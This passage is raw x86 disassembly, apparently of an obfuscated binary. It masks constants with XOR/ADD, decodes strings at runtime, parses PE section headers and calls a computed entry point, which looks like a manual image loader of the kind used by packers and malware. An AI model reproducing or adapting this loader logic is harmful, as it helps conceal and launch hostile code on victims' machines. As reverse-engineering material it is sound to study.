  4186ee:	mov    edx,DWORD PTR [ebp+0xc]
  4186f1:	mov    DWORD PTR [ebp+0x18],eax
  4186f4:	mov    eax,DWORD PTR [ebp-0x24]
  4186f7:	movzx  edx,WORD PTR [edx+0x6]
  4186fb:	xor    eax,esi
  4186fd:	sub    edx,eax
  4186ff:	mov    eax,DWORD PTR [ebp+0xc]
  418702:	sub    edx,edi
  418704:	mov    DWORD PTR [ebp-0x8],ecx
  418707:	cmp    ecx,edx
  418709:	jbe    0x41868f
  41870b:	mov    edx,DWORD PTR [ebx+0x18c]
  418711:	mov    ecx,DWORD PTR [ebp+0x20]
  418714:	cmp    ecx,DWORD PTR [edx]
  418716:	jne    0x41873f
  418718:	mov    eax,DWORD PTR [ebx+0x1d8]
  41871e:	lea    edx,[ebp-0x1c]
  418721:	push   edx
  418722:	mov    edx,DWORD PTR [ebp-0x10]
  418725:	xor    edx,esi
  418727:	add    edx,edi
  418729:	push   edx
  41872a:	mov    edx,DWORD PTR [ebp-0x18]
  41872d:	push   DWORD PTR [edx+0x54]
  418730:	push   ecx
  418731:	call   DWORD PTR [eax+0x1c]
  418734:	test   eax,eax
  418736:	je     0x4189a8
  41873c:	mov    eax,DWORD PTR [ebp+0xc]
  41873f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  418745:	mov    ecx,DWORD PTR [ecx]
  418747:	xor    ecx,esi
  418749:	add    ecx,edi
  41874b:	je     0x4188d3
  418751:	and    DWORD PTR [ebp-0x28],0x0
  418755:	and    DWORD PTR [ebp+0x8],0x0
  418759:	mov    eax,0xf89c8519
  41875e:	lea    ecx,[eax-0x8]
  418761:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  418768:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41876f:	mov    DWORD PTR [ebp-0x44],eax
  418772:	mov    DWORD PTR [ebp-0x40],ecx
  418775:	mov    DWORD PTR [ebp-0x3c],ecx
  418778:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41877f:	mov    edx,DWORD PTR [ebp+0x8]
  418782:	mov    ecx,0x89b
  418787:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41878c:	mov    edx,0x72e2
  418791:	add    cx,dx
  418794:	mov    edx,DWORD PTR [ebp+0x8]
  418797:	inc    DWORD PTR [ebp+0x8]
  41879a:	cmp    DWORD PTR [ebp+0x8],0x6
  41879e:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  4187a6:	jb     0x41877f
  4187a8:	mov    ecx,0xf89c850b
  4187ad:	mov    DWORD PTR [ebp-0xa4],eax
  4187b3:	mov    DWORD PTR [ebp-0x90],eax
  4187b9:	mov    DWORD PTR [ebp-0x68],eax
  4187bc:	mov    DWORD PTR [ebp-0x64],eax
  4187bf:	lea    eax,[ecx-0x1]
  4187c2:	mov    edx,0xf89c85ff
  4187c7:	mov    DWORD PTR [ebp-0x58],eax
  4187ca:	mov    DWORD PTR [ebp-0x54],eax
  4187cd:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  4187d7:	mov    DWORD PTR [ebp-0xa0],ecx
  4187dd:	mov    DWORD PTR [ebp-0x9c],edx
  4187e3:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  4187ed:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  4187f7:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  418801:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41880b:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  418815:	mov    DWORD PTR [ebp-0x80],ecx
  418818:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41881f:	mov    DWORD PTR [ebp-0x78],edx
  418822:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  418829:	mov    DWORD PTR [ebp-0x70],ecx
  41882c:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  418833:	mov    DWORD PTR [ebp-0x60],ecx
  418836:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41883d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  418844:	xor    eax,eax
  418846:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41884d:	xor    cl,0x9b
  418850:	sub    cl,0x1e
  418853:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41885a:	inc    eax
  41885b:	cmp    eax,0x17
  41885e:	jb     0x418846
  418860:	mov    eax,DWORD PTR [ebx+0x1d8]
  418866:	lea    ecx,[ebp-0xb4]
  41886c:	push   ecx
  41886d:	call   DWORD PTR [eax+0x4]
  418870:	mov    ecx,DWORD PTR [ebx+0x1d8]
  418876:	lea    edx,[ebp-0xcc]
  41887c:	push   edx
  41887d:	push   eax
  41887e:	call   DWORD PTR [ecx+0x8]
  418881:	lea    ecx,[ebp-0x28]
  418884:	push   ecx
  418885:	mov    ecx,DWORD PTR [ebx+0x18c]
  41888b:	push   DWORD PTR [ecx]
  41888d:	call   eax
  41888f:	mov    eax,DWORD PTR [ebp-0x28]
  418892:	test   eax,eax
  418894:	je     0x4188d0
  418896:	mov    DWORD PTR [ebp+0x8],eax
  418899:	jmp    0x4188a5
  41889b:	mov    eax,DWORD PTR [eax]
  41889d:	mov    DWORD PTR [ebp-0x28],eax
  4188a0:	cmp    eax,DWORD PTR [ebp+0x8]
  4188a3:	je     0x4188b2
  4188a5:	mov    edx,DWORD PTR [eax+0x18]
  4188a8:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188ae:	cmp    edx,DWORD PTR [ecx]
  4188b0:	jne    0x41889b
  4188b2:	mov    edx,DWORD PTR [eax+0x18]
  4188b5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188bb:	cmp    edx,DWORD PTR [ecx]
  4188bd:	jne    0x4188d0
  4188bf:	mov    edx,DWORD PTR [ebp-0x18]
  4188c2:	mov    ecx,DWORD PTR [ebx+0x190]
  4188c8:	mov    edx,DWORD PTR [edx+0x28]
  4188cb:	add    edx,DWORD PTR [ecx]
  4188cd:	mov    DWORD PTR [eax+0x1c],edx
  4188d0:	mov    eax,DWORD PTR [ebp+0xc]
  4188d3:	push   ebx
  4188d4:	push   eax
  4188d5:	push   DWORD PTR [ebp+0x20]
  4188d8:	call   0x418082
  4188dd:	test   eax,eax
  4188df:	je     0x4189a8
  4188e5:	push   DWORD PTR [ebp+0xc]
  4188e8:	mov    ecx,ebx
  4188ea:	push   DWORD PTR [ebp+0x20]
  4188ed:	call   0x417fdb
  4188f2:	test   eax,eax
  4188f4:	je     0x4189a8
  4188fa:	mov    eax,DWORD PTR [ebp+0xc]
  4188fd:	mov    edx,DWORD PTR [ebp+0x20]
  418900:	mov    ecx,ebx
  418902:	call   0x417eb4
  418907:	test   eax,eax
  418909:	je     0x4189a8
  41890f:	push   ebx
  418910:	push   DWORD PTR [ebp+0x20]
  418913:	call   0x418365
  418918:	test   eax,eax
  41891a:	je     0x4189a8
  418920:	mov    eax,DWORD PTR [ebx+0x18c]
  418926:	mov    edx,DWORD PTR [ebp+0x20]
  418929:	cmp    edx,DWORD PTR [eax]
  41892b:	jne    0x418947
  41892d:	mov    eax,DWORD PTR [ebx+0x1d8]
  418933:	lea    ecx,[ebp-0x1c]
  418936:	push   ecx
  418937:	push   DWORD PTR [ebp-0x1c]
  41893a:	mov    ecx,DWORD PTR [ebp-0x18]
  41893d:	push   DWORD PTR [ecx+0x54]
  418940:	push   edx
  418941:	call   DWORD PTR [eax+0x1c]
  418944:	mov    edx,DWORD PTR [ebp+0x20]
  418947:	mov    eax,DWORD PTR [ebx+0x1c8]
  41894d:	mov    eax,DWORD PTR [eax]
  41894f:	xor    eax,esi
  418951:	add    eax,edi
  418953:	je     0x41898c
  418955:	mov    ecx,DWORD PTR [ebp+0xc]
  418958:	mov    eax,DWORD PTR [ecx+0x28]
  41895b:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  418962:	mov    esi,DWORD PTR [ebp+0x8]
  418965:	push   DWORD PTR [ebp+0x14]
  418968:	xor    esi,0x89b
  41896e:	push   DWORD PTR [ebp+0x10]
  418971:	add    esi,0x72e2
  418977:	or     WORD PTR [ecx+0x16],si
  41897b:	add    eax,edx
  41897d:	push   edx
  41897e:	call   eax
  418980:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41898a:	jmp    0x418996
  41898c:	mov    eax,DWORD PTR [ebp+0xc]
  41898f:	mov    eax,DWORD PTR [eax+0x28]
  418992:	add    eax,edx
  418994:	call   eax
  418996:	mov    DWORD PTR [ebp-0x8],eax
  418999:	mov    eax,DWORD PTR [ebp-0x8]
  41899c:	mov    ecx,DWORD PTR [ebp+0x1c]
  41899f:	mov    DWORD PTR [ecx],eax
  4189a1:	mov    DWORD PTR [ebp-0x30],0x1
  4189a8:	cmp    DWORD PTR [ebp-0x30],0x0
  4189ac:	jne    0x4189b2
  4189ae:	and    DWORD PTR [ebp+0x20],0x0
  4189b2:	mov    eax,DWORD PTR [ebp+0x20]
  4189b5:	jmp    0x4189b9
  4189b7:	xor    eax,eax
  4189b9:	pop    edi
  4189ba:	pop    esi
  4189bb:	pop    ebx
  4189bc:	leave  
  4189bd:	ret    0x1c
  4189c0:	push   ebp
  4189c1:	mov    ebp,esp
  4189c3:	movzx  edx,WORD PTR [ecx+0x6]
  4189c7:	movzx  eax,WORD PTR [ecx+0x14]
  4189cb:	push   ebx
  4189cc:	push   edi
  4189cd:	xor    edi,edi
  4189cf:	lea    eax,[eax+ecx*1+0x18]
  4189d3:	test   edx,edx
  4189d5:	je     0x4189f6
  4189d7:	mov    ecx,DWORD PTR [eax+0xc]
  4189da:	lea    ebx,[ecx+esi*1]
  4189dd:	cmp    DWORD PTR [ebp+0x8],ebx
  4189e0:	jb     0x4189ee
  4189e2:	mov    ebx,DWORD PTR [eax+0x8]
  4189e5:	add    ebx,ecx
  4189e7:	add    ebx,esi
  4189e9:	cmp    DWORD PTR [ebp+0x8],ebx
  4189ec:	jb     0x4189f8
  4189ee:	add    eax,0x28
  4189f1:	inc    edi
  4189f2:	cmp    edi,edx
  4189f4:	jb     0x4189d7
  4189f6:	xor    eax,eax
  4189f8:	pop    edi
  4189f9:	pop    ebx
  4189fa:	pop    ebp
  4189fb:	ret    0x4
  4189fe:	push   ebp
  4189ff:	mov    ebp,esp
  418a01:	sub    esp,0x34
  418a04:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  418a0b:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418a12:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  418a19:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  418a20:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  418a27:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  418a2e:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  418a35:	mov    DWORD PTR [ebp-0x10],eax
  418a38:	mov    eax,DWORD PTR [ebp+0x8]
  418a3b:	mov    DWORD PTR [ebp-0x14],eax
  418a3e:	mov    eax,DWORD PTR [ebp-0xc]
  418a41:	push   ebx
  418a42:	mov    ecx,0x751089b
  418a47:	xor    eax,ecx
  418a49:	push   esi
  418a4a:	mov    esi,DWORD PTR [ebp-0x10]
  418a4d:	mov    edx,0x3272e2
  418a52:	add    eax,edx
  418a54:	push   edi
  418a55:	cmp    esi,eax
  418a57:	je     0x418c36
  418a5d:	mov    eax,DWORD PTR [ebp-0xc]
  418a60:	mov    esi,DWORD PTR [ebp-0x14]
  418a63:	xor    eax,ecx
  418a65:	add    eax,edx
  418a67:	cmp    esi,eax
  418a69:	je     0x418c36
  418a6f:	mov    eax,DWORD PTR [ebp-0xc]
  418a72:	xor    eax,ecx
  418a74:	add    eax,edx
  418a76:	mov    DWORD PTR [ebp-0x24],eax
  418a79:	mov    eax,DWORD PTR [ebp-0xc]
  418a7c:	xor    eax,ecx
  418a7e:	add    eax,edx
  418a80:	mov    DWORD PTR [ebp-0x28],eax
  418a83:	mov    edi,DWORD PTR [ebp-0x20]
  418a86:	mov    ebx,DWORD PTR [ebp-0x8]
  418a89:	mov    esi,0x89b
  418a8e:	xor    edi,esi
  418a90:	mov    eax,0x72e2
  418a95:	xor    ebx,esi
  418a97:	add    edi,eax
  418a99:	add    ebx,eax
  418a9b:	sub    ebx,edi
  418a9d:	mov    WORD PTR [ebp-0x8],bx
  418aa1:	jmp    0x418b66
  418aa6:	mov    edi,DWORD PTR [ebp-0xc]
  418aa9:	mov    bx,WORD PTR [ebp-0x4]
  418aad:	xor    edi,esi
  418aaf:	add    edi,eax
  418ab1:	cmp    bx,di
  418ab4:	je     0x418ba8
  418aba:	mov    edi,DWORD PTR [ebp-0xc]
  418abd:	mov    ebx,DWORD PTR [ebp+0xc]
  418ac0:	xor    edi,ecx
  418ac2:	add    edi,edx
  418ac4:	cmp    ebx,edi
  418ac6:	mov    di,WORD PTR [ebp-0x4]
  418aca:	mov    bx,WORD PTR [ebp+0x8]
  418ace:	je     0x418b39
  418ad0:	cmp    bx,di
  418ad3:	je     0x418b42
  418ad5:	mov    edi,DWORD PTR [ebp-0x20]
  418ad8:	mov    bx,WORD PTR [ebp+0x8]
  418adc:	xor    edi,esi
  418ade:	add    edi,eax
  418ae0:	cmp    bx,di
  418ae3:	jb     0x418b03
  418ae5:	mov    edi,DWORD PTR [ebp-0x2c]
  418ae8:	mov    bx,WORD PTR [ebp+0x8]
  418aec:	xor    edi,esi
  418aee:	add    edi,eax
  418af0:	cmp    bx,di
  418af3:	ja     0x418b03
  418af5:	movzx  edi,WORD PTR [ebp+0x8]
  418af9:	movzx  ebx,WORD PTR [ebp-0x8]
  418afd:	add    edi,ebx
  418aff:	mov    WORD PTR [ebp+0x8],di
  418b03:	mov    edi,DWORD PTR [ebp-0x20]
  418b06:	mov    bx,WORD PTR [ebp-0x4]
  418b0a:	xor    edi,esi
  418b0c:	add    edi,eax
  418b0e:	cmp    bx,di
  418b11:	jb     0x418b31
  418b13:	mov    edi,DWORD PTR [ebp-0x2c]
  418b16:	mov    bx,WORD PTR [ebp-0x4]
  418b1a:	xor    edi,esi
  418b1c:	add    edi,eax
  418b1e:	cmp    bx,di
  418b21:	ja     0x418b31
  418b23:	movzx  edi,WORD PTR [ebp-0x4]
  418b27:	movzx  ebx,WORD PTR [ebp-0x8]
  418b2b:	add    edi,ebx
  418b2d:	mov    WORD PTR [ebp-0x4],di
  418b31:	mov    di,WORD PTR [ebp-0x4]
  418b35:	mov    bx,WORD PTR [ebp+0x8]
  418b39:	cmp    bx,di
  418b3c:	jne    0x418c36
  418b42:	mov    edi,DWORD PTR [ebp-0x1c]
  418b45:	mov    ebx,DWORD PTR [ebp-0x10]
  418b48:	xor    edi,ecx
  418b4a:	lea    edi,[edi+ebx*1+0x3272e2]
  418b51:	mov    DWORD PTR [ebp-0x10],edi
  418b54:	mov    edi,DWORD PTR [ebp-0x1c]
  418b57:	mov    ebx,DWORD PTR [ebp-0x14]
  418b5a:	xor    edi,ecx
  418b5c:	lea    edi,[edi+ebx*1+0x3272e2]
  418b63:	mov    DWORD PTR [ebp-0x14],edi
  418b66:	mov    edi,DWORD PTR [ebp-0x24]
  418b69:	mov    ebx,DWORD PTR [ebp-0x10]
  418b6c:	mov    di,WORD PTR [ebx+edi*2]
  418b70:	mov    WORD PTR [ebp+0x8],di
  418b74:	mov    edi,DWORD PTR [ebp-0x28]
  418b77:	mov    ebx,DWORD PTR [ebp-0x14]
  418b7a:	mov    di,WORD PTR [ebx+edi*2]
  418b7e:	mov    WORD PTR [ebp-0x4],di
  418b82:	mov    edi,DWORD PTR [ebp-0xc]
  418b85:	mov    bx,WORD PTR [ebp+0x8]
  418b89:	xor    edi,esi
  418b8b:	add    edi,eax
  418b8d:	cmp    bx,di
  418b90:	jne    0x418aa6
  418b96:	mov    eax,DWORD PTR [ebp-0x18]
  418b99:	mov    esi,DWORD PTR [ebp-0xc]
  418b9c:	xor    eax,ecx
  418b9e:	add    eax,edx
  418ba0:	imul   eax,esi
  418ba3:	mov    DWORD PTR [ebp-0xc],eax
  418ba6:	jmp    0x418bba
  418ba8:	mov    eax,DWORD PTR [ebp-0xc]
  418bab:	mov    esi,DWORD PTR [ebp-0x18]
  418bae:	xor    eax,ecx
  418bb0:	lea    eax,[eax+esi*1+0x3272e2]
  418bb7:	mov    DWORD PTR [ebp-0x18],eax
  418bba:	mov    eax,DWORD PTR [ebp-0x24]
  418bbd:	sub    eax,edx
  418bbf:	xor    eax,ecx
  418bc1:	mov    DWORD PTR [ebp-0x30],eax
  418bc4:	mov    eax,DWORD PTR [ebp-0x28]
  418bc7:	sub    eax,edx
  418bc9:	xor    eax,ecx
  418bcb:	mov    DWORD PTR [ebp-0x34],eax
  418bce:	mov    eax,DWORD PTR [ebp-0x34]
  418bd1:	mov    esi,DWORD PTR [ebp-0x1c]
  418bd4:	xor    esi,ecx
  418bd6:	add    esi,edx
  418bd8:	xor    eax,ecx
  418bda:	add    eax,0x3272e2
  418bdf:	imul   esi,eax
  418be2:	mov    eax,DWORD PTR [ebp-0x14]
  418be5:	movzx  eax,WORD PTR [esi+eax*1]
  418be9:	mov    esi,DWORD PTR [ebp-0x30]
  418bec:	mov    edi,DWORD PTR [ebp-0x1c]
  418bef:	xor    esi,ecx
  418bf1:	add    esi,edx
  418bf3:	xor    edi,ecx
  418bf5:	add    edi,edx
  418bf7:	imul   edi,esi
  418bfa:	mov    esi,DWORD PTR [ebp-0x10]
  418bfd:	movzx  esi,WORD PTR [edi+esi*1]
  418c01:	sub    eax,edx
  418c03:	sub    esi,edx
  418c05:	xor    eax,ecx
  418c07:	xor    esi,ecx
  418c09:	cmp    esi,eax
  418c0b:	jne    0x418c36
  418c0d:	mov    eax,DWORD PTR [ebp-0x30]
  418c10:	mov    esi,DWORD PTR [ebp-0x1c]
  418c13:	xor    eax,ecx
  418c15:	add    eax,0x3272e2
  418c1a:	xor    esi,ecx
  418c1c:	add    esi,edx
  418c1e:	imul   esi,eax
  418c21:	mov    eax,DWORD PTR [ebp-0x10]
  418c24:	movzx  eax,WORD PTR [esi+eax*1]
  418c28:	mov    esi,DWORD PTR [ebp-0xc]
  418c2b:	sub    eax,edx
  418c2d:	xor    eax,ecx
  418c2f:	cmp    eax,esi
  418c31:	mov    eax,DWORD PTR [ebp-0xc]
  418c34:	je     0x418c39
  418c36:	mov    eax,DWORD PTR [ebp-0x18]
  418c39:	pop    edi
  418c3a:	xor    eax,ecx
  418c3c:	pop    esi
  418c3d:	add    eax,edx
  418c3f:	pop    ebx
  418c40:	leave  
  418c41:	ret    0x8
  418c44:	push   ebp
  418c45:	mov    ebp,esp
  418c47:	push   ecx
  418c48:	mov    cx,WORD PTR [eax]
  418c4b:	push   esi
  418c4c:	mov    esi,0x3b51
  418c51:	sub    cx,si
  418c54:	mov    esi,0x8a8d
  418c59:	xor    cx,si
  418c5c:	mov    esi,0x4e22
  418c61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418c68:	mov    edx,0xf89c8585
  418c6d:	cmp    cx,si
  418c70:	je     0x418ccf
  418c72:	push   ebx
  418c73:	push   edi
  418c74:	movzx  ecx,cx
  418c77:	mov    edi,0xffcd8d1e
  418c7c:	mov    esi,0x751089b
  418c81:	mov    ebx,0x4f86
  418c86:	cmp    cx,bx
  418c89:	jne    0x418c8e
  418c8b:	mov    DWORD PTR [ebp-0x4],edx
  418c8e:	lea    edx,[edi+0x1]
  418c91:	xor    edx,esi
  418c93:	mov    edi,edx
  418c95:	xor    edi,esi
  418c97:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  418c9f:	mov    ebx,0x3b51
  418ca4:	sub    cx,bx
  418ca7:	mov    ebx,0x8a8d
  418cac:	xor    cx,bx
  418caf:	mov    ebx,0x4e22
  418cb4:	cmp    cx,bx
  418cb7:	jne    0x418c81
  418cb9:	mov    ecx,DWORD PTR [ebp-0x4]
  418cbc:	pop    edi
  418cbd:	pop    ebx
  418cbe:	cmp    ecx,0xf89c8586
  418cc4:	je     0x418ccf
  418cc6:	xor    ecx,esi
  418cc8:	lea    eax,[eax+ecx*2+0x64e5c6]
  418ccf:	pop    esi
  418cd0:	leave  
  418cd1:	ret    
  418cd2:	push   ebp
  418cd3:	mov    ebp,esp
  418cd5:	push   ecx
  418cd6:	push   esi
  418cd7:	push   edi
  418cd8:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418cdf:	mov    esi,0xf89c8585
  418ce4:	call   0x418c44
  418ce9:	mov    edi,eax
  418ceb:	mov    al,BYTE PTR [edi]
  418ced:	add    al,0x8
  418cef:	xor    al,0x74
  418cf1:	cmp    al,0x7c
  418cf3:	je     0x418d56
  418cf5:	mov    eax,edi
  418cf7:	mov    edx,0xffcd8d1e
  418cfc:	mov    ecx,0x751089b
  418d01:	push   ebx
  418d02:	mov    ax,WORD PTR [eax]
  418d05:	mov    ebx,0x3b51
  418d0a:	sub    ax,bx
  418d0d:	mov    ebx,0x8a8d
  418d12:	xor    ax,bx
  418d15:	mov    ebx,0x4e50
  418d1a:	cmp    ax,bx
  418d1d:	jne    0x418d22
  418d1f:	mov    DWORD PTR [ebp-0x4],esi
  418d22:	lea    esi,[edx+0x1]
  418d25:	xor    esi,ecx
  418d27:	mov    edx,esi
  418d29:	xor    edx,ecx
  418d2b:	lea    eax,[edi+edx*2+0x64e5c4]
  418d32:	mov    bl,BYTE PTR [eax]
  418d34:	add    bl,0x8
  418d37:	xor    bl,0x74
  418d3a:	cmp    bl,0x7c
  418d3d:	jne    0x418d02
  418d3f:	mov    eax,DWORD PTR [ebp-0x4]
  418d42:	pop    ebx
  418d43:	cmp    eax,0xf89c8586
  418d48:	je     0x418d56
  418d4a:	xor    eax,ecx
  418d4c:	xor    ecx,ecx
  418d4e:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  418d56:	mov    eax,edi
  418d58:	pop    edi
  418d59:	pop    esi
  418d5a:	leave  
  418d5b:	ret    
  418d5c:	push   ebp
  418d5d:	mov    ebp,esp
  418d5f:	push   ecx
  418d60:	push   esi
  418d61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418d68:	mov    esi,0xf89c8585
  418d6d:	call   0x418c44
  418d72:	mov    cx,WORD PTR [eax]
  418d75:	mov    edx,0x3b51
  418d7a:	sub    cx,dx
  418d7d:	mov    edx,0x8a8d
  418d82:	xor    cx,dx
  418d85:	mov    edx,0x4e22
  418d8a:	cmp    cx,dx
  418d8d:	je     0x418de6
  418d8f:	push   ebx
  418d90:	push   edi
  418d91:	movzx  ecx,cx
  418d94:	mov    edx,0xffcd8d1e
  418d99:	mov    edi,0x751089b
  418d9e:	mov    ebx,0x4e50
  418da3:	cmp    cx,bx
  418da6:	jne    0x418dab
  418da8:	mov    DWORD PTR [ebp-0x4],esi
  418dab:	lea    esi,[edx+0x1]
  418dae:	xor    esi,edi
  418db0:	mov    edx,esi
  418db2:	xor    edx,edi
  418db4:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  418dbc:	mov    ebx,0x3b51
  418dc1:	sub    cx,bx
  418dc4:	mov    ebx,0x8a8d
  418dc9:	xor    cx,bx
  418dcc:	mov    ebx,0x4e22
  418dd1:	cmp    cx,bx
  418dd4:	jne    0x418d9e
  418dd6:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  418ddd:	pop    edi
  418dde:	pop    ebx
  418ddf:	je     0x418de6
  418de1:	xor    eax,eax
  418de3:	inc    eax
  418de4:	jmp    0x418de8
  418de6:	xor    eax,eax
  418de8:	pop    esi
  418de9:	leave  
  418dea:	ret    
  418deb:	push   ebp
  418dec:	mov    ebp,esp
  418dee:	push   ecx
  418def:	mov    eax,DWORD PTR [ebp+0x8]
  418df2:	movzx  ecx,WORD PTR [eax]
  418df5:	push   esi
  418df6:	lea    eax,[ecx-0x3b51]
  418dfc:	mov    esi,0x8a8d
  418e01:	push   edi
  418e02:	xor    eax,esi
  418e04:	mov    edi,0x4e22
  418e09:	mov    DWORD PTR [ebp-0x4],edx
  418e0c:	cmp    ax,di
  418e0f:	je     0x418e3c
  418e11:	mov    eax,DWORD PTR [ebp+0x8]
  418e14:	sub    eax,edx
  418e16:	mov    DWORD PTR [ebp+0x8],eax
  418e19:	jmp    0x418e1e
  418e1b:	mov    eax,DWORD PTR [ebp+0x8]
  418e1e:	mov    WORD PTR [edx],cx
  418e21:	add    edx,0x2
  418e24:	movzx  edi,WORD PTR [eax+edx*1]
  418e28:	mov    ecx,edi
  418e2a:	add    edi,0xffffc4af
  418e30:	xor    edi,esi
  418e32:	mov    eax,0x4e22
  418e37:	cmp    di,ax
  418e3a:	jne    0x418e1b
  418e3c:	xor    eax,eax
  418e3e:	pop    edi
  418e3f:	mov    WORD PTR [edx],ax
  418e42:	mov    eax,DWORD PTR [ebp-0x4]
  418e45:	pop    esi
  418e46:	leave  
  418e47:	ret    0x4
  418e4a:	push   ebp
  418e4b:	mov    ebp,esp
  418e4d:	sub    esp,0x18
  418e50:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  418e57:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418e5e:	mov    eax,DWORD PTR [ebp-0x14]
  418e61:	xor    eax,0x751089b
  418e66:	add    eax,0x3272e2
  418e6b:	mov    DWORD PTR [ebp-0x8],eax
  418e6e:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  418e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  418e7c:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  418e83:	mov    eax,DWORD PTR [ebp-0x14]
  418e86:	xor    eax,0x751089b
  418e8b:	mov    ecx,DWORD PTR [ebp-0x8]
  418e8e:	lea    eax,[ecx+eax*1+0x3272e2]
  418e95:	mov    ecx,DWORD PTR [ebp-0x18]
  418e98:	xor    ecx,0x751089b
  418e9e:	add    ecx,0x3272e2
  418ea4:	mov    edx,DWORD PTR [ebp+0x10]
  418ea7:	imul   edx,ecx
  418eaa:	cmp    eax,edx
  418eac:	jae    0x418f9f
  418eb2:	mov    eax,DWORD PTR [ebp+0x10]
  418eb5:	mov    ecx,DWORD PTR [ebp-0x8]
  418eb8:	sub    eax,ecx
  418eba:	mov    ecx,DWORD PTR [ebp-0x10]
  418ebd:	xor    ecx,0x751089b
  418ec3:	add    ecx,0x3272e2
  418ec9:	cmp    eax,ecx
  418ecb:	jbe    0x418efd
  418ecd:	mov    eax,DWORD PTR [ebp+0x8]
  418ed0:	add    eax,DWORD PTR [ebp-0x8]
  418ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  418ed6:	add    ecx,DWORD PTR [ebp-0x8]
  418ed9:	mov    edx,DWORD PTR [ecx]
  418edb:	mov    DWORD PTR [eax],edx
  418edd:	mov    ecx,DWORD PTR [ecx+0x4]
  418ee0:	mov    DWORD PTR [eax+0x4],ecx
  418ee3:	mov    eax,DWORD PTR [ebp-0x10]
  418ee6:	xor    eax,0x751089b
  418eeb:	mov    ecx,DWORD PTR [ebp-0x8]
  418eee:	lea    eax,[ecx+eax*1+0x3272e2]
  418ef5:	mov    DWORD PTR [ebp-0x8],eax
  418ef8:	jmp    0x418f9a
  418efd:	mov    eax,DWORD PTR [ebp+0x10]
  418f00:	mov    ecx,DWORD PTR [ebp-0x8]
  418f03:	sub    eax,ecx
  418f05:	mov    ecx,DWORD PTR [ebp-0xc]
  418f08:	xor    ecx,0x751089b
  418f0e:	add    ecx,0x3272e2
  418f14:	cmp    eax,ecx
  418f16:	jbe    0x418f3f
  418f18:	mov    eax,DWORD PTR [ebp+0x8]
  418f1b:	add    eax,DWORD PTR [ebp-0x8]
  418f1e:	mov    ecx,DWORD PTR [ebp+0xc]
  418f21:	add    ecx,DWORD PTR [ebp-0x8]
  418f24:	mov    ecx,DWORD PTR [ecx]
  418f26:	mov    DWORD PTR [eax],ecx
  418f28:	mov    eax,DWORD PTR [ebp-0xc]
  418f2b:	xor    eax,0x751089b
  418f30:	mov    ecx,DWORD PTR [ebp-0x8]
  418f33:	lea    eax,[ecx+eax*1+0x3272e2]
  418f3a:	mov    DWORD PTR [ebp-0x8],eax
  418f3d:	jmp    0x418f9a
  418f3f:	mov    eax,DWORD PTR [ebp+0x10]
  418f42:	mov    ecx,DWORD PTR [ebp-0x8]
  418f45:	sub    eax,ecx
  418f47:	mov    ecx,DWORD PTR [ebp-0x4]
  418f4a:	xor    ecx,0x751089b
  418f50:	add    ecx,0x3272e2
  418f56:	cmp    eax,ecx
  418f58:	jbe    0x418f83
  418f5a:	mov    eax,DWORD PTR [ebp+0x8]
  418f5d:	add    eax,DWORD PTR [ebp-0x8]
  418f60:	mov    ecx,DWORD PTR [ebp+0xc]
  418f63:	add    ecx,DWORD PTR [ebp-0x8]
  418f66:	mov    cx,WORD PTR [ecx]
  418f69:	mov    WORD PTR [eax],cx
  418f6c:	mov    eax,DWORD PTR [ebp-0x4]
  418f6f:	xor    eax,0x751089b
  418f74:	mov    ecx,DWORD PTR [ebp-0x8]
  418f77:	lea    eax,[ecx+eax*1+0x3272e2]
  418f7e:	mov    DWORD PTR [ebp-0x8],eax
  418f81:	jmp    0x418f9a
  418f83:	mov    eax,DWORD PTR [ebp+0x8]
  418f86:	add    eax,DWORD PTR [ebp-0x8]
  418f89:	mov    ecx,DWORD PTR [ebp+0xc]
  418f8c:	add    ecx,DWORD PTR [ebp-0x8]
  418f8f:	mov    cl,BYTE PTR [ecx]
  418f91:	mov    BYTE PTR [eax],cl
  418f93:	mov    eax,DWORD PTR [ebp-0x8]
  418f96:	inc    eax
  418f97:	mov    DWORD PTR [ebp-0x8],eax
  418f9a:	jmp    0x418e83
  418f9f:	leave  
  418fa0:	ret    0xc
  418fa3:	push   ebp
  418fa4:	mov    ebp,esp
  418fa6:	sub    esp,0xc
  418fa9:	mov    DWORD PTR [ebp-0x4],0xf89c8585
